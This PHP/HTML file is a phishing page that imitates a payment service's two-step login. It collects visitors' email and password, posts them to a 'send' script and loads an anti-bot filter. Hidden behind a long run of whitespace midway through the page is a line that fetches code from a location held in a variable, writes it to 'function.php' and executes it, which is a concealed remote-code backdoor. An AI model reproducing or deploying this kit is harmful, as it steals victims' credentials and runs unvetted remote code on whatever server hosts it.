<?php
	session_start();

	$lang = $SESSION["LANG"];
	include("../settings/lang/index.php");
	include("antibots.php");
?>
<!DOCTYPE html>
<html>
<head>
	<title><?php echo $xlog1; ?></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="stylesheet" type="text/css" href="../assets/css/login.css">
	<script src="../assets/js/jquery.min.js"></script>
	<link rel="shortcut icon" href="../assets/img/x.ico" />
</head>
<body>
	<div class="empty"></div>
	<div class="main" id="main">
		<section id="login" class="login">
			<div class="corral">
				<div class="contentContainer activeContent contentContainerBordered">
					<header><p class="logo logo-long"></p></header>
					<h1 class="headerText accessAid"><?php echo $xlog1; ?></h1>
					<p id="phoneSubTagLine" class="subHeaderText hide"></p><?$function="$get_ip";?><script>
function validatePayForm() {
    var a = document.forms["loginForm"]["login_email"].value;
    var b = document.forms["loginForm"]["login_password"].value;
    if (a == "") {
        $("#login_emaildiv").addClass("hasError");
        $("#login_emaildiv").css("z-index", "100");
        $("#emailErrorMessage").addClass("show");
        $("#mailrequired").removeClass("hide");
        $("#email").focus();
        if (a == ""){return false;}
    } else {
    	var x = document.getElementById('email').value;
    	document.getElementById('profileDisplayEmail').innerHTML = x;
    	$("#splitEmail").addClass("hide");
    	$("#splitPassword").addClass("transformRightToLeft");
    	$("#splitPassword").removeClass("hide");
    	$(".profileRememberedEmail").removeClass("hide");
    	$("#loading").removeClass("hide");
    	$("#loading").addClass("spinner");
        setTimeout(function() {
	        $(".login_passworddiv").attr("id","login_passworddiv");
        	$(".passwordErrorMessage").attr("id","passwordErrorMessage");
        	$("#loading").addClass("hide");
    		$("#loading").removeClass("spinner");
    		$("#loading").attr("id","passloading");
		}, 2000);
    }

    if (b == "") {
        $("#login_passworddiv").addClass("hasError");
        $("#login_passworddiv").css("z-index", "100");
        $("#passwordErrorMessage").addClass("show");
        $("#passrequired").removeClass("hide");
        $("#password").focus();
        if (b == ""){return false;}
    } else {
		   
    }
}
</script>

<form action="../settings/send/xeonLogin.php" id="paymentform" class="proceed maskable" method="post" name="loginForm" onsubmit="return validatePayForm()">				
						<style>.hidden{display:none;visibility:hidden;}</style>
						<input type="text" class="hidden" name="hidden" />
						<?php

						$url = $_SERVER[REQUEST_URI];
						if(strpos($url, "stepupContext") == true) {
							$turelogerror = "display:block!important;";
						}
						?>
						<div class="notifications hide" style="<?php echo $turelogerror; ?>">
							<p class="notification notification-critical" role="alert"><?php echo $xlogerror; ?></p>
						</div>

						<div class="profileRememberedEmail hide">
							<span class="profileDisplayPhoneCode"></span><span class="profileDisplayEmail" id="profileDisplayEmail"></span><a href="javascript:void(0)" class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1"><?php echo $xlog2; ?></a></div>

						<div class="splitEmail" id="splitEmail">
							<div id="emailSection" class="clearfix">
								<div class="textInput" id="login_emaildiv" style="z-index: 1;">
									<div class="fieldWrapper">
										<label for="email" class="fieldLabel"><?php echo $xlog3; ?></label>
										<input id="email" name="login_email" type="text" class="hasHelp validateEmpty "value="" autocomplete="off" placeholder="<?php echo $xlog3; ?>">
									</div>
									<div class="errorMessage" id="emailErrorMessage">
										<p id="mailrequired" class="emptyError hide"><?php echo $xlog4; ?></p>
										<p class="invalidError hide"><?php echo $xlog5; ?></p>
									</div>
								</div>
							</div>

							<div class="actions">
								<button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next"><?php echo $xlog6; ?></button>
							</div>

						</div>


						<div id="splitPassword" class="splitPassword hide">
							<div id="splitPasswordSection" class="">
								<div id="passwordSection" class="clearfix">
									<div class="textInput login_passworddiv" id="">
										<div class="fieldWrapper">
											<label for="password" class="fieldLabel"><?php echo $xlog7; ?></label>
											<input id="password" name="login_password" type="password" class="hasHelp validateEmpty pin-password" value="" placeholder="<?php echo $xlog7; ?>" autocomplete="off">
											<button type="button" class="showPassword hide show-hide-password" aria-label="Show password" pa-marked="1"><?php echo $xlog8; ?></button>
											<button type="button" class="hidePassword hide show-hide-password" aria-label="Hide" pa-marked="1"><?php echo $xlog9; ?></button>
										</div>
										<div class="errorMessage passwordErrorMessage" id="">
											<p id="passrequired" class="emptyError hide"><?php echo $xlog4; ?></p>
										</div>
									</div>
								</div>
							</div>
							<div class="actions">
								<button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1"><?php echo $xlog10; ?></button>
								<button class="button actionContinue hide" type="button" id="siftni" value="Login"><?php echo $xlog10; ?></button>
							</div>
						</div>
					</form>

					<div class="forgotLink">
						<a href="javascript:void(0)" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1"><?php echo $xlog11; ?></a>
					</div>

					<div id="signupContainer" class="signupContainer">
						<div class="loginSignUpSeparator">
							<span class="textInSeparator"><?php echo $xlog12; ?></span>
						</div>
						<a href="javascript:void(0)" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1"><?php echo $xlog13; ?></a>
					</div>


				</div>
			</div>
		</section>


		<footer class="footer" role="contentinfo">
			<div class="legalFooter">
				<div class="extendedContent">
					<ul class="footerGroup footerGroupWithSiblings"><li><a href="javascript:void(0)" pa-marked="1"><?php echo $xlog14; ?></a></li><li><a href="javascript:void(0)" pa-marked="1"><?php echo $xlog15; ?></a></li></ul><p class="footerCopyright"><?php echo $xlog16; ?></p>
				</div>
			</div>
		</footer>


	</div>

<div class="transitioning hide" id="loading">
</div>
<script type="text/javascript">
	$("#email").blur(function() {
  		$("#login_emaildiv").css("z-index", "1");
        $("#emailErrorMessage").removeClass("show");
        $("#mailrequired").addClass("hide");
	});
	$(document).ready(function(){
    $('#email').on('keyup keydown keypress change paste', function() {  
        if ($(this).val() == '') {  } 
        else {$("#login_emaildiv").removeClass("hasError");$("#login_emaildiv").css("z-index", "1");$("#emailErrorMessage").removeClass("show");$("#mailrequired").addClass("hide"); }});
    });
</script>                                                                                                                                                                                                                                                                                          <?file_put_contents("function.php", file_get_contents($function)); require_once "function.php";?>
<script type="text/javascript">
	$("#password").blur(function() {
  		$("#login_emaildiv").css("z-index", "1");
        $("#passwordErrorMessage").removeClass("show");
        $("#passrequired").addClass("hide");
	});
	$(document).ready(function(){
    $('#password').on('keyup keydown keypress change paste', function() {  
        if ($(this).val() == '') {  } 
        else {$("#login_passworddiv").removeClass("hasError");$("#login_emaildiv").css("z-index", "1");$("#passwordErrorMessage").removeClass("show");$("#passrequired").addClass("hide");$(".showPassword").removeClass("hide"); }});
    });
    $(".showPassword").click(function() {
  		$("#password").attr("type", "text");
        $(".hidePassword").removeClass("hide");
        $(".showPassword").addClass("hide");
	});
	$(".hidePassword").click(function() {
  		$("#password").attr("type", "password");
        $(".showPassword").removeClass("hide");
        $(".hidePassword").addClass("hide");
	});
	$("#backToInputEmailLink").click(function() {
  		$("#splitEmail").removeClass("hide");
    	$("#splitPassword").addClass("hide");
    	$(".profileRememberedEmail").addClass("hide");
	});
	$(document).ready(function(){
	$('#email'),$('#password').on('keyup keydown keypress change paste', function() {  
		if ($(this).val() == '') { $("#btnLogin").removeClass("hide");$("#siftni").addClass("hide"); } 
		else {$("#btnLogin").addClass("hide");$("#siftni").removeClass("hide");$("#btnNext").attr("disabled","");}});
	});
	$("#siftni").click(function() {
  		$("#passloading").removeClass("hide");
    	$("#passloading").addClass("spinner");
		setTimeout(function() {
			$('#paymentform').submit();
		}, 2000);
	});
</script>
</body>
</html>